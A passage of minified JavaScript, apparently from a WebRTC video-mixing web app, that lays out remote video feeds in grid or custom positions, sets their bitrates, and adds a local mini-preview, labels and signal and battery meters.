if(session.rpcs[i].virtualHangup||session.rpcs[i].bandwidthMuted||session.rpcs[i].directorVideoMuted)continue;!1!==session.scene&&3===session.sceneType&&(countOrder+=1,!1===session.order?session.rpcs[i].videoElement.style.display=1==countOrder?"block":"none":session.order===countOrder?session.rpcs[i].videoElement.style.display="block":session.rpcs[i].videoElement.style.display="none"),"none"==session.rpcs[i].videoElement.style.display?!1!==session.scene?(session.requestRateLimit(session.hiddenSceneViewBitrate,i,!0),session.hiddenSceneViewBitrate||(session.rpcs[i].videoElement.nogb=2)):session.requestRateLimit(0,i,!0):!1!==session.scene?(!1!==sceneBitrate?!1!==screenShareBitrate&&session.rpcs[i].screenShareState?session.requestRateLimit(screenShareBitrate,i):session.requestRateLimit(sceneBitrate,i):session.requestRateLimit(-1,i),!1!==session.rpcs[i].order?session.rpcs[i].videoElement.order=session.rpcs[i].order:session.rpcs[i].videoElement.order=0,session.activeSpeaker&&!session.rpcs[i].defaultSpeaker?session.rpcs[i].videoElement in mediaPool_invisible&&errorlog("THIS SHOULD NOT HAPPEN; 650"):doNotPush||mediaPool.push(session.rpcs[i].videoElement)):!1!==session.roomid?(!1!==session.rpcs[i].order?session.rpcs[i].videoElement.order=session.rpcs[i].order:session.rpcs[i].videoElement.order=0,session.activeSpeaker&&!session.rpcs[i].defaultSpeaker?session.rpcs[i].videoElement in mediaPool_invisible&&errorlog("THIS SHOULD NOT HAPPEN; 665"):doNotPush||mediaPool.push(session.rpcs[i].videoElement),""===session.roomid&&session.bitrate?session.requestRateLimit(-1,i):!1!==screenShareBitrate&&session.rpcs[i].screenShareState?session.requestRateLimit(screenShareBitrate,i):session.requestRateLimit(roomBitrate,i)):(!1!==session.rpcs[i].order?session.rpcs[i].videoElement.order=session.rpcs[i].order:session.rpcs[i].videoElement.order=0,session.activeSpeaker&&!session.rpcs[i].defaultSpeaker?session.rpcs[i].videoElement in mediaPool_invisible&&errorlog("THIS SHOULD NOT HAPPEN; 684"):doNotPush||mediaPool.push(session.rpcs[i].videoElement),sceneBitrate?session.requestRateLimit(sceneBitrate,i):!1!==session.screenShareBitrate&&session.rpcs[i].screenShareState?session.requestRateLimit(session.screenShareBitrate,i):session.requestRateLimit(-1,i)),2==session.rpcs[i].videoElement.nogb?(session.rpcs[i].videoElement.nogb=1,session.rpcs[i].videoElement.classList.add("nogb")):1==session.rpcs[i].videoElement.nogb&&(session.rpcs[i].videoElement.nogb=0,session.rpcs[i].videoElement.classList.remove("nogb"))}}}if(session.broadcastIFrame&&session.broadcastIFrame.src&&(mediaPool.length||mediaPool.push(session.broadcastIFrame)),document.fullscreenElement)try{if("VIDEO"===document.fullscreenElement.tagName)for(i=0;i<mediaPool.length;i++)mediaPool[i].id!==document.fullscreenElement.id&&mediaPool[i].dataset&&mediaPool[i].dataset.UUID&&mediaPool[i].tagName&&"VIDEO"==mediaPool[i].tagName&&(session.requestRateLimit(session.hiddenSceneViewBitrate,mediaPool[i].dataset.UUID,null),mediaPool_invisible.push(mediaPool[i]),mediaPool.splice(i,1))}catch(e){errorlog(e)}for(var sscount=0,skip=!1,m=0;m<mediaPool.length;m++)mediaPool[m].alreadyAdded=!1;if(session.layout||(session.orderby&&("id"==session.orderby?mediaPool.sort(compare_vids_sid):"label"==session.orderby?mediaPool.sort(compare_vids_label):mediaPool.sort(compare_vids_sid)),mediaPool.sort(compare_vids)),session.fakeFeeds&&session.fakeFeeds.length&&mediaPool.length<session.fakeFeeds.length)for(let i=0;i<session.fakeFeeds.length;i++)if(mediaPool.length<session.fakeFeeds.length)mediaPool.push(session.fakeFeeds[i]);else try{session.fakeFeeds[i].remove()}catch(e){errorlog(e)}var mpl=session.slots||mediaPool.length;if(!sssid){if(mpl>1){var NW,NH,current,BB=0,rw=1,rh=1;for(NW=1;NW<=mpl;NW++){NH=Math.ceil(mpl/NW);var www=ww/NW,hhh=hh/NH;(current=www>hhh?Math.round(hhh*hhh*(mpl/(NW*NH))):Math.round(www*www*(mpl/(NW*NH))))>=BB&&(BB=current,rw=NW,rh=NH),mediaPool[NW-1]&&(mediaPool[NW-1].dataset.UUID?mediaPool[NW-1].dataset.UUID in session.rpcs&&session.rpcs[mediaPool[NW-1].dataset.UUID].screenShareState&&(sscount+=1,sssid=mediaPool[NW-1].dataset.sid):"id"in mediaPool[NW-1]&&"screensharesource"==mediaPool[NW-1].id&&session.notifyScreenShare&&(sscount+=1,sssid=mediaPool[NW-1].dataset.sid))}}else rw=1,rh=1;sscount>1&&(sssid=!1)}}catch(e){errorlog(e),sssid=!1}var customLayout=!1;if(session.notifyScreenShare||!1===session.scene){if(sssid&&!session.layout){customLayout={},mediaPool.length>=12?customLayout[sssid]={x:0,y:10,w:90,h:90,c:!1}:mediaPool.length>=10?customLayout[sssid]={x:0,y:10,w:100,h:90,c:!1}:mediaPool.length>=8?customLayout[sssid]={x:0,y:20,w:80,h:80,c:!1}:7==mediaPool.length?customLayout[sssid]={x:0,y:0,w:83.33333,h:100,c:!1}:(5==mediaPool.length||mediaPool.length,customLayout[sssid]={x:0,y:0,w:80,h:100,c:!1});var posCount=0;for(i=0;i<mediaPool.length;i++)mediaPool[i].dataset.sid!==sssid&&(2==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:80,y:0,w:20,h:100,c:session.cover}:3==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:80,y:41*posCount+9,w:20,h:41,c:session.cover}:4==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:80,y:33.3333*posCount,w:20,h:33.3333,c:session.cover}:5==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:80,y:25*posCount,w:20,h:25,c:session.cover}:6==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:80,y:20*posCount,w:20,h:20,c:session.cover}:7==mediaPool.length?customLayout[mediaPool[i].dataset.sid]={x:83.33333,y:16.66667*posCount,w:16.66667,h:16.66667,c:session.cover}:8==mediaPool.length?customLayout[mediaPool[i].dataset.sid]=4==posCount?{x:10,y:0,w:20,h:20,c:!0}:5==posCount?{x:30,y:0,w:20,h:20,c:!0}:6==posCount?{x:50,y:0,w:20,h:20,c:!0}:{x:80,y:25*posCount,w:20,h:25,c:!0}:9==mediaPool.length?customLayout[mediaPool[i].dataset.sid]=4==posCount?{x:0,y:0,w:20,h:20,c:!0}:5==posCount?{x:20,y:0,w:20,h:20,c:!0}:6==posCount?{x:40,y:0,w:20,h:20,c:!0}:7==posCount?{x:60,y:0,w:20,h:20,c:!0}:{x:80,y:25*posCount,w:20,h:25,c:!0}:mediaPool.length>=10?customLayout[mediaPool[i].dataset.sid]=posCount<10?{x:10*posCount,y:0,w:10,h:10,c:!0}:{x:90,y:10*(posCount-9),w:10,h:10,c:!0}:customLayout[mediaPool[i].dataset.sid]={x:80,y:20*posCount,w:20,h:20,c:!0},posCount+=1)}}else;try{if(!skip){for(var childNodes=playarea.childNodes,n=0;n<childNodes.length;n++)if(childNodes[n].querySelector("video")){var vidtemp=childNodes[n].querySelector("video"),matched=!1;for(m=0;m<mediaPool.length;m++)if(vidtemp.id===mediaPool[m].id){vidtemp.alreadyAdded=!0,mediaPool[m]=vidtemp,matched=!0,childNodes[n].matched=!0;break}matched||(vidtemp.isInvisible=!1)}else if(childNodes[n].querySelector("iframe")){var iftemp=childNodes[n].querySelector("iframe");if(iftemp.framesource){if(session.layout&&session.layout[""])for(i=0;i<session.layout[""].length;i++)session.layout[""][i].iframeSrc&&session.layout[""][i].iframeSrc==iftemp.framesource&&(childNodes[n].matched=!0,iftemp.isConnected&&(iftemp.alreadyAdded=!0));continue}for(m=0;m<mediaPool.length;m++)if("IFRAME"===mediaPool[m].nodeName&&mediaPool[m].src&&iftemp.src===mediaPool[m].src){iftemp.alreadyAdded=!0,iftemp.id=mediaPool[m].id,-1==session.directorList.indexOf(iftemp.dataset.UUID)&&(iftemp.dataset.UUID=mediaPool[m].dataset.UUID,iftemp.dataset.sid=mediaPool[m].dataset.sid),mediaPool[m]=iftemp,childNodes[n].matched=!0;break}}for(n=0;n<childNodes.length;n++)childNodes[n].matched?childNodes[n].matched=null:(playarea.removeChild(childNodes[n]),n--)}}catch(e){errorlog(e)}if(session.videoElement&&(session.videoElement.src||session.videoElement.srcObject))if("playlist"in session.videoElement)playarea.appendChild(session.videoElement);else if("none"!==session.videoElement.style.display)if(session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getVideoTracks().length){if(miniPreview){var container=null;if(0===mpl&&2===miniPreview)!0!==soloVideo&&(session.layout||(session.videoElement.container&&"minipreview"==session.videoElement.container.id&&delete session.videoElement.container,document.getElementById("minipreview")&&document.getElementById("minipreview").remove()),mediaPool.push(session.videoElement),mpl=1);else if(3===miniPreview)!0!==soloVideo&&(container=document.createElement("div"),session.videoElement.container=container,container.style.top="-500px",container.style.left="-500px",container.style.width="1px",container.style.height="1px",container.style.zIndex="0",container.style.margin="0",container.style.position="absolute",container.style.cursor="pointer",container.style.border="0",container.appendChild(session.videoElement),playarea.appendChild(container));else if(!0!==soloVideo){if(document.getElementById("minipreview"))container=document.getElementById("minipreview");else{container=document.createElement("div");var togglePreview=document.createElement("div");togglePreview.className="togglePreview";try{container.style.top="calc("+hi+"px + 2vh)",container.style.maxHeight=parseInt(getById("gridlayout").offsetHeight)+"px",togglePreview.style.top="calc("+hi+"px + 2vh)",togglePreview.style.maxHeight=parseInt(getById("gridlayout").offsetHeight)+"px"}catch(e){errorlog(e),container.style.top=hi+"px",togglePreview.style.top=hi+"px"}null!==miniPerformerY&&(container.style.top=miniPerformerY+"%"),null!==miniPerformerX?(session.widget&&!session.leftMiniPreview&&miniPerformerX>74&&(miniPerformerX=74),container.style.left=miniPerformerX+"%"):!1!==session.leftMiniPreview?(container.style.left=session.leftMiniPreview+"%",togglePreview.style.left=session.leftMiniPreview+"%"):session.widget?(container.style.right="25%",togglePreview.style.right="25%"):(container.style.right="2vw",togglePreview.style.right="2vw"),container.appendChild(session.videoElement),session.videoElement.container=container,playarea.appendChild(container),togglePreview.innerHTML='<i class="las la la-eye-slash"></i><i class="las la la-eye"></i>',session.previewToggleState||(container.classList.toggle("hidden"),togglePreview.classList.toggle("blinded")),iOS||iPad||playarea.appendChild(togglePreview),togglePreview.onclick=function(event){return event.preventDefault(),event.stopPropagation(),getById("minipreview").classList.toggle("hidden"),this.classList.toggle("blinded"),session.previewToggleState=!session.previewToggleState,!1},makeMiniDraggableElement(container),container.id="minipreview"}container.style.width="18%",container.style.zIndex="3",container.style.margin="0",container.style.position="absolute",container.style.cursor="pointer",container.style.border="2px #BBB solid",container.style.height="block",applyMirror(session.mirrorExclude)}else!0===soloVideo&&document.getElementById("minipreview")&&((container=document.getElementById("minipreview")).style.height="100%");if(session.ruleOfThirds&&container&&"minipreview"==container.id&&!container.svg){var svg=document.createElement("img");svg.src=session.ruleOfThirds,svg.style.width="100%",svg.style.height="100%",svg.style.position="absolute",svg.style.left="0",svg.style.top="0",container.svg=svg,container.appendChild(svg)}container=null}}else session.streamSrc&&!session.videoElement.srcObject&&warnlog("THIS SHOULD NOT HAPPEN; 2067");try{if(session.slots){var slotArray=[];mediaPool.forEach((vid=>{vid.slotBlank&&(vid.slotBlank=!1,vid.slot=0),"slot"in vid&&vid.slot&&(slotArray.includes(parseInt(vid.slot))?vid.slot=0:slotArray.push(parseInt(vid.slot)))}));var slotCounter=1;mediaPool.reverse();for(j=mediaPool.length;j--;){if(!("slot"in mediaPool[j])||"0"==mediaPool[j].slot||!mediaPool[j].slot){for(;slotArray.includes(slotCounter);)slotCounter+=1;slotArray.push(slotCounter),mediaPool[j].slot=slotCounter,mediaPool[j].slotBlank=!0}"slot"in mediaPool[j]&&parseInt(mediaPool[j].slot)&&"0"!=mediaPool[j].slot&&mediaPool[j].slot&&!(session.slots<parseInt(mediaPool[j].slot))||(mediaPool_invisible.push(mediaPool[j]),mediaPool.splice(j,1))}mediaPool.reverse()}mediaPool_invisible.forEach((vid=>{if(vid)try{if(vid.style.width="0px",vid.style.height="0px",vid.style.top="0px",vid.style.left="0px",vid.isInvisible=!0,vid.alreadyAdded&&1==vid.alreadyAdded)return void(vid.alreadyAdded=!1);if(vid.dataset.doNotMove)return;playarea.appendChild(vid)}catch(e){errorlog(e)}}))}catch(e){errorlog(e)}var layout=!1;if(customLayout||session.layout){if(layout=session.layout||customLayout,(layout={...layout})[""])for(i=0;i<layout[""].length;i++){if(layout[""][i].defaultStreamID&&!layout[layout[""][i].defaultStreamID]){var found=!1;for(var ell in mediaPool)mediaPool[ell].dataset.sid&&mediaPool[ell].dataset.sid===layout[""][i].defaultStreamID&&(layout[layout[""][i].defaultStreamID]=layout[""][i],found=!0);if(found)continue}if(layout["#"+i]=layout[""][i],layout["#"+i].iframeSrc){if(session.iframeSrcs[layout["#"+i].iframeSrc])(ele=session.iframeSrcs[layout["#"+i].iframeSrc]).id="#"+i;else(ele=loadIframe(parseURL4Iframe(layout["#"+i].iframeSrc),"#"+i)).framesource=layout["#"+i].iframeSrc,session.iframeSrcs[layout["#"+i].iframeSrc]=ele}else{if(!layout["#"+i].backgroundMedia)continue;var ele;(ele=document.createElement("div")).dataset.sid="#"+i}ele.dataset.sid="#"+i,mediaPool.push(ele)}try{mediaPool=sortByZ(mediaPool,layout)}catch(e){errorlog(e)}}i=0;if(!session.waitImage||mediaPool_invisible.length||mediaPool.length){if(session.waitImage)try{clearTimeout(session.waitImageTimeoutObject),session.waitImageTimeoutObject=!1,getById("retryimage").style.display="none"}catch(e){}}else session.waitImageTimeoutObject||(session.waitImageTimeoutObject=setTimeout((function(){session.waitImageTimeoutObject=!0,document.getElementById("retryimage")||(playarea.innerHTML+='<img id="retryimage"/>',getById("retryimage").src=decodeURIComponent(session.waitImage),getById("retryimage").onerror=function(){this.style.display="none"},session.cover&&(getById("retryimage").style.objectFit="cover")),getById("retryimage").style.display="block"}),session.waitImageTimeout));mediaPool.forEach((vid=>{try{if(!vid||!("id"in vid))return void errorlog(vid);if(vid.needsLoading)try{vid.load()}catch(e){errorlog(e)}if(session.slots){if(!("slot"in vid)||!parseInt(vid.slot))return;if((i=parseInt(vid.slot)-1)<0)return}var offsetx=0;0!==i&&Math.ceil((i+.01)/rw)==rh&&mpl%rw&&(offsetx=Math.max(w/rw*(rw-mpl%rw)/2,0));var cover=session.cover,borderOffset=session.border||0,videoMargin=session.videoMargin||0,borderRadius=session.borderRadius||0,borderColor=session.borderColor||"#000",fadein=session.fadein||!1,backgroundMedia=session.defaultMedia||!1,animated=session.animatedMoves||0;if(borderOffset||(borderColor="#0000"),layout){if(!vid.dataset.sid||!(vid.dataset.sid in layout))return vid.isInvisible=!0,vid.container&&(vid.container.style.display="none"),void(vid.dataset.UUID&&session.requestRateLimit(session.hiddenSceneViewBitrate,vid.dataset.UUID,!1));"borderThickness"in layout[vid.dataset.sid]&&(borderOffset=layout[vid.dataset.sid].borderThickness||0),"animated"in layout[vid.dataset.sid]&&!0===(animated=layout[vid.dataset.sid].animated||0)&&(animated=session.animatedMoves||50),"margin"in layout[vid.dataset.sid]&&(videoMargin=layout[vid.dataset.sid].margin||0),"rounded"in layout[vid.dataset.sid]&&(borderRadius=layout[vid.dataset.sid].rounded||0),layout[vid.dataset.sid].borderColor&&(borderColor=layout[vid.dataset.sid].borderColor),layout[vid.dataset.sid].fadeIn&&(fadein=layout[vid.dataset.sid].fadeIn),"backgroundMedia"in layout[vid.dataset.sid]&&(backgroundMedia=layout[vid.dataset.sid].backgroundMedia||!1),vid.container&&("IFRAME"==vid.nodeName&&vid.isConnected||vid.alreadyAdded&&"IFRAME"!=vid.nodeName||playarea.appendChild(vid.container))}var skipAnimation=!1;if(vid.isInvisible&&(vid.isInvisible=!1,skipAnimation=!0,fadein&&(vid.classList.add("fadein"),vid.holder&&vid.holder.classList.add("fadein"))),offsety=Math.max((h-Math.ceil(mpl/rw)*Math.ceil(h/rh))/2,0),vid.container){(container=vid.container).move&&(clearInterval(container.move),container.move=null)}else{var container=document.createElement("div");vid.container=container}if(container.style.position="absolute",container.style.display="block",container.classList.add("container_holder_video"),layout){var left=w/100*layout[vid.dataset.sid].x||layout[vid.dataset.sid].xp||0,top=h/100*layout[vid.dataset.sid].y||layout[vid.dataset.sid].yp||0;top+=hi;var width=w/100*layout[vid.dataset.sid].w||layout[vid.dataset.sid].wp||0,height=h/100*layout[vid.dataset.sid].h||layout[vid.dataset.sid].hp||0;cover=!(!layout[vid.dataset.sid].cover&&!layout[vid.dataset.sid].c),container.style.zIndex=layout[vid.dataset.sid].zIndex||layout[vid.dataset.sid].z||0}else left=Math.max(offsetx+Math.floor((i%rw+0)*w/rw),0),top=Math.max(offsety+Math.floor((Math.floor(i/rw)+0)*h/rh+hi),0),width=Math.ceil(w/rw),height=Math.ceil(h/rh);var computed=getComputedStyle(vid);container.style.transition=animated&&!skipAnimation?"width "+animated+"ms ease-in-out 0s, height "+animated+"ms ease-in-out 0s, background-color "+animated+"ms ease-in-out 0s, transform "+animated+"ms ease-in-out 0s, top "+animated+"ms ease-in-out 0s, left "+animated+"ms ease-in-out 0s":"",layout?(container.style.left=left+"px",container.style.top=top+"px",container.style.width=width+"px",container.style.height=height+"px",container.twidth=width,container.theight=height):(container.style.left=offsetx+Math.floor((i%rw+0)*w/rw)+"px",container.style.top=offsety+Math.floor((Math.floor(i/rw)+0)*h/rh+hi)+"px",container.twidth=Math.ceil(w/rw),container.theight=Math.ceil(h/rh),container.style.width=container.twidth+"px",container.style.height=container.theight+"px");var maxWidth=0;maxWidth=parseInt(computed.width)>parseInt(container.style.width)?computed.width:container.style.width;var maxHeight=0;if(maxHeight=parseInt(computed.height)>parseInt(container.style.height)?computed.height:container.style.height,cover?(vid.style.maxWidth=maxWidth,vid.style.maxHeight=maxHeight,vid.style.objectFit="cover"):(vid.style.objectFit="contain",vid.style.maxWidth=maxWidth,vid.style.maxHeight=maxHeight),vid.alreadyAdded&&1==vid.alreadyAdded)if(container.holder)holder=container.holder;else{var holder=document.createElement("div");container.holder=holder,holder.className="holder",holder.dataset.holder=!0,container.appendChild(holder),holder.appendChild(vid)}else{if(vid.dataset.doNotMove)return vid.style.position="absolute",vid.style.left=left+"px",vid.style.top=top+"px",vid.style.width=width+"px",vid.style.height=height+"px",vid.style.display="flex",void(i+=1);if(container.holder){(holder=container.holder).prepend(vid)}else{var holder=document.createElement("div");container.holder=holder,holder.className="holder",holder.dataset.holder=!0,holder.appendChild(vid),container.appendChild(holder)}playarea.appendChild(container),vid.style.maxWidth="100%",vid.style.maxHeight="100%"}if(layout)var wrw=w/100*layout[vid.dataset.sid].w||0,hrh=h/100*layout[vid.dataset.sid].h||0;else wrw=w/rw,hrh=h/rh;if(backgroundMedia?(container.style.backgroundImage="url("+backgroundMedia+")",container.style.backgroundSize=cover?"cover":"contain",container.style.backgroundPosition="center",container.style.backgroundRepeat="no-repeat"):container.style.backgroundImage&&(container.style.backgroundImage="unset"),"rotated"in vid&&!1!==vid.rotated&&(90==vid.rotated?vid.style.transform="rotate(90deg)":270==vid.rotated?vid.style.transform="rotate(270deg)":180==vid.rotated?vid.style.transform="rotate(180deg)":vid.rotated||(vid.style.transform="rotate(0deg)")),vid.style.width="100%",vid.style.height="100%",holder.style.position="absolute",vid.classList.contains("paused"))if(holder.paused)holder.paused.className="playButton";else{var paused=document.createElement("span");paused.id="paused_"+vid.dataset.UUID,paused.className="playButton",paused.dataset.UUID=vid.dataset.UUID,paused.onclick=function(){unPauseVideo(vid)},holder.paused=paused,holder.appendChild(paused)}else holder.paused&&(holder.paused.className="hidden");var vw=vid.naturalWidth||vid.videoWidth,vh=vid.naturalHeight||vid.videoHeight;if(cover&&!session.structure){if(!("rotated"in vid)||90!=vid.rotated&&270!=vid.rotated?(holder.style.left=videoMargin+"px",holder.style.top=videoMargin+"px",holder.style.height="calc(100% - "+2*videoMargin+"px)",holder.style.width="calc(100% - "+2*videoMargin+"px)",vid.style.width="100%",vid.style.height="100%",vid.style.left=0,vid.style.top=0):(holder.style.left=borderOffset+"px",holder.style.top=borderOffset+"px",holder.style.height="calc(100% - "+2*videoMargin+"px)",holder.style.width="calc(100% - "+2*videoMargin+"px)",vid.style.width=height-2*(borderOffset+videoMargin)+"px",vid.style.height=width-2*(borderOffset+videoMargin)+"px",vid.style.left=0,vid.style.top=0),session.sharperScreen&&sssid&&vid.dataset.sid&&vid.dataset.sid===sssid);else if(session.dynamicScale&&vid.dataset.UUID){let targetWidth=wrw,targetHeight=hrh;targetWidth-=2*(borderOffset+videoMargin),targetHeight-=2*(borderOffset+videoMargin),targetWidth<0&&(targetWidth=0),targetHeight<0&&(targetHeight=0),session.devicePixelRatio?session.requestResolution(vid.dataset.UUID,targetWidth*session.devicePixelRatio,targetHeight*session.devicePixelRatio,!0,!1,cover):window.devicePixelRatio&&parseInt(window.devicePixelRatio)>1?session.requestResolution(vid.dataset.UUID,targetWidth*window.devicePixelRatio,targetHeight*window.devicePixelRatio,!0,!1,cover):session.requestResolution(vid.dataset.UUID,targetWidth,targetHeight,!0,!1,cover)}vid.style.borderColor=borderColor,vid.style.borderWidth=borderOffset+"px",vid.style.borderRadius=borderRadius+"px",holder.style.borderColor=borderColor,holder.style.borderWidth="0px",holder.style.borderRadius=borderRadius+"px"}else if(vw&&vh||vid.width&&vid.height||vid.dataset.aspectRatio){if(!("rotated"in vid)||90!=vid.rotated&&270!=vid.rotated)if(vw&&vh)vvw=parseInt(vw),vvh=parseInt(vh);else if(vid.width&&vid.height)vvw=parseInt(vid.width),vvh=parseInt(vid.height);else vvw=vid.dataset.aspectRatio,vvh=1;else{if(vw&&vh)var vvw=parseInt(vh),vvh=parseInt(vw);else if(vid.width&&vid.height)var vvw=parseInt(vid.height),vvh=parseInt(vid.width);else var vvw=1,vvh=vid.dataset.aspectRatio;vid.style.objectFit="cover",vid.style.overflow="unset"}var asw=(wrw-2*videoMargin-2*borderOffset)/vvw,ash=(hrh-2*videoMargin-2*borderOffset)/vvh;if(session.structure){var tarx=arW/arH;if((wrw-2*videoMargin-2*borderOffset)/(hrh-2*videoMargin-2*borderOffset)>tarx)var hsl=(wrw-(hsw=hrh*tarx-2*videoMargin*tarx-2*borderOffset))/2,hst=videoMargin,hsh=hrh-2*videoMargin;else{hst=(hrh-(hsh=(wrw-2*videoMargin+2*borderOffset)/tarx))/2,hsl=videoMargin;var hsw=wrw-2*videoMargin}}else if(asw>ash)hst=videoMargin,hsl=(wrw-(hsw=vvw/vvh*((hsh=hrh-2*videoMargin)-2*borderOffset)+2*borderOffset))/2;else hsl=videoMargin,hst=(hrh-(hsh=((hsw=wrw-2*videoMargin)-2*borderOffset)/(vvw/vvh)+2*borderOffset))/2;if(holder.style.left=Math.floor(hsl)+"px",holder.style.top=Math.floor(hst)+"px",holder.style.width=Math.ceil(hsw)+"px",holder.style.height=Math.ceil(hsh)+"px",holder.style.borderColor=borderColor,holder.style.borderWidth=borderOffset+"px",holder.style.borderRadius=borderRadius+"px",vid.style.borderWidth="0px",!("rotated"in vid)||90!=vid.rotated&&270!=vid.rotated){if(!1!==session.blurBackground&&"VIDEO"==vid.nodeName&&!container.blurred&&vid.srcObject&&(asw>1&&ash>1||asw>=1||ash>=1))vid.srcObject.getVideoTracks().forEach((trk=>{container.blurred?container.blurred.paused&&container.blurred.play():(container.blurred=document.createElement("video"),container.blurred.controls=!1,container.blurred.style="z-index:-10000;position:absolute;left:0;width:100%;height:100%;top:0;object-fit:fill;-webkit-filter: blur("+session.blurBackground+"px)",container.blurred.srcObject=createMediaStream(),container.blurred.srcObject.addTrack(trk),container.blurred.play(),holder.appendChild(container.blurred))}));else if(!1!==session.blurBackground&&"VIDEO"==vid.nodeName&&vid.srcObject&&(asw>1&&ash>1||asw>=1||ash>=1))container.blurred.paused&&container.blurred.play();else if(container.blurred){try{container.blurred.remove()}catch(e){}try{delete container.blurred}catch(e){}}}else vid.style.width=Math.ceil(wrw-2*borderOffset)+"px",vid.style.height=Math.ceil(hsw-2*borderOffset)+"px",vid.style.left=0,vid.style.maxWidth="100vh",vid.style.maxHeight="100vw",ChromiumVersion&&ChromiumVersion<77?(!animated&&parseInt(container.style.width)>parseInt(holder.style.height)||animated&&container.twidth&&parseInt(container.twidth)>parseInt(holder.style.height))&&(vid.style.position="relative",vid.style.objectFit="contain"):vid.style.position="relative";if(session.sharperScreen&&sssid&&vid.dataset.sid&&vid.dataset.sid===sssid);else if(session.dynamicScale&&vid.dataset.UUID){let targetWidth=wrw,targetHeight=hrh;targetWidth-=2*(borderOffset+videoMargin),targetHeight-=2*(borderOffset+videoMargin),targetWidth<0&&(targetWidth=0),targetHeight<0&&(targetHeight=0),session.devicePixelRatio?session.requestResolution(vid.dataset.UUID,targetWidth*session.devicePixelRatio,targetHeight*session.devicePixelRatio,!0,!1,cover):window.devicePixelRatio&&parseInt(window.devicePixelRatio)>1?session.requestResolution(vid.dataset.UUID,targetWidth*window.devicePixelRatio,targetHeight*window.devicePixelRatio,!0,!1,cover):session.requestResolution(vid.dataset.UUID,targetWidth,targetHeight,!0,!1,cover)}}else{if(holder.style.left=borderOffset+videoMargin+"px",holder.style.top=borderOffset+videoMargin+"px",holder.style.height="calc(100% - "+(borderOffset+2*videoMargin)+"px)",holder.style.width="calc(100% - "+(borderOffset+2*videoMargin)+"px)",session.sharperScreen&&sssid&&vid.dataset.sid&&vid.dataset.sid===sssid);else if(session.dynamicScale&&vid.dataset.UUID){let targetWidth=wrw,targetHeight=hrh;targetWidth-=2*(borderOffset+videoMargin),targetHeight-=2*(borderOffset+videoMargin),targetWidth<0&&(targetWidth=0),targetHeight<0&&(targetHeight=0),session.devicePixelRatio?session.requestResolution(vid.dataset.UUID,targetWidth*session.devicePixelRatio,targetHeight*session.devicePixelRatio,!0,!1,cover):window.devicePixelRatio&&parseInt(window.devicePixelRatio)>1?session.requestResolution(vid.dataset.UUID,targetWidth*window.devicePixelRatio,targetHeight*window.devicePixelRatio,!0,!1,cover):session.requestResolution(vid.dataset.UUID,targetWidth,targetHeight,!0,!1,cover)}holder.style.borderColor=borderColor,holder.style.borderWidth=borderOffset+"px",holder.style.borderRadius=borderRadius+"px",vid.style.borderWidth="0px"}if(session.colorVideosBackground?vid.style.backgroundColor=session.colorVideosBackground:vid.style.backgroundColor="unset",vid.dataset.UUID&&session.rpcs[vid.dataset.UUID]&&"label"in session.rpcs[vid.dataset.UUID]&&!1!==session.rpcs[vid.dataset.UUID].label&&!0===session.showlabels){if(animated&&container.twidth&&container.theight)var vidwidth=container.twidth,vidheight=container.theight;else vidwidth=vid.offsetWidth,vidheight=vid.offsetHeight;var fontsize=.03*(vidwidth+vidheight);if(vidwidth/16>=vidheight/9)var voar=vidwidth/16/(vidheight/9);else voar=vidheight/9/(vidwidth/16);if(fontsize/=voar=Math.pow(voar,.5),holder.label)var label=holder.label;else{label=document.createElement("span");holder.label=label,session.labelstyle?label.className="video-label "+session.labelstyle:label.className="video-label",holder.appendChild(label)}fontsize&&(session.labelsize&&(fontsize=fontsize*session.labelsize/100),label.style.fontSize=parseInt(fontsize)+"px"),label.innerText=session.rpcs[vid.dataset.UUID].label,label.innerText&&(label.innerHTML=label.innerHTML.split("\\n").map((word=>`<span>${word}</span>`)).join(" "))}else if(!0===session.showlabels&&"videosource"===vid.id&&session.label){if(animated&&container.twidth&&container.theight)vidwidth=container.twidth,vidheight=container.theight;else vidwidth=vid.offsetWidth,vidheight=vid.offsetHeight;fontsize=.03*(vidwidth+vidheight);if(vidwidth/16>=vidheight/9)voar=vidwidth/16/(vidheight/9);else voar=vidheight/9/(vidwidth/16);if(fontsize/=voar=Math.pow(voar,.5),holder.label)label=holder.label;else{label=document.createElement("span");holder.label=label,session.labelstyle?label.className="video-label "+session.labelstyle:label.className="video-label",holder.appendChild(label)}fontsize&&(session.labelsize&&(fontsize=fontsize*session.labelsize/100),label.style.fontSize=parseInt(fontsize)+"px"),label.innerText=sanitizeLabel(session.label),label.innerText&&(label.innerHTML=label.innerHTML.split("\\n").map((word=>`<span>${word}</span>`)).join(" ")),holder.appendChild(label)}else holder.label&&(holder.label.remove(),delete holder.label);if(vid.dataset.UUID&&session.rpcs[vid.dataset.UUID]&&(session.rpcs[vid.dataset.UUID].voiceMeter&&holder.appendChild(session.rpcs[vid.dataset.UUID].voiceMeter),session.rpcs[vid.dataset.UUID].remoteMuteElement&&holder.appendChild(session.rpcs[vid.dataset.UUID].remoteMuteElement),session.signalMeter&&(vid.dataset.UUID&&!session.rpcs[vid.dataset.UUID].signalMeter?(session.rpcs[vid.dataset.UUID].signalMeter=getById("signalMeterTemplate").cloneNode(!0),session.rpcs[vid.dataset.UUID].signalMeter.classList.remove("hidden"),session.rpcs[vid.dataset.UUID].signalMeter.id="signalMeter_"+vid.dataset.UUID,session.rpcs[vid.dataset.UUID].signalMeter.dataset.level=0,session.rpcs[vid.dataset.UUID].signalMeter.title=getTranslation("signal-meter"),holder.appendChild(session.rpcs[vid.dataset.UUID].signalMeter),holder.signalMeter=session.rpcs[vid.dataset.UUID].signalMeter):vid.dataset.UUID&&session.rpcs[vid.dataset.UUID].signalMeter&&(holder.signalMeter||(holder.appendChild(session.rpcs[vid.dataset.UUID].signalMeter),holder.signalMeter=session.rpcs[vid.dataset.UUID].signalMeter))),session.batteryMeter&&(vid.dataset.UUID&&!session.rpcs[vid.dataset.UUID].batteryMeter?(session.rpcs[vid.dataset.UUID].batteryMeter=getById("batteryMeterTemplate").cloneNode(!0),session.rpcs[vid.dataset.UUID].batteryMeter.classList.remove("hidden"),session.rpcs[vid.dataset.UUID].batteryMeter.id="batteryMeter_"+vid.dataset.UUID,session.rpcs[vid.dataset.UUID].batteryMeter.dataset.level=0,session.rpcs[vid.dataset.UUID].batteryMeter.title=getTr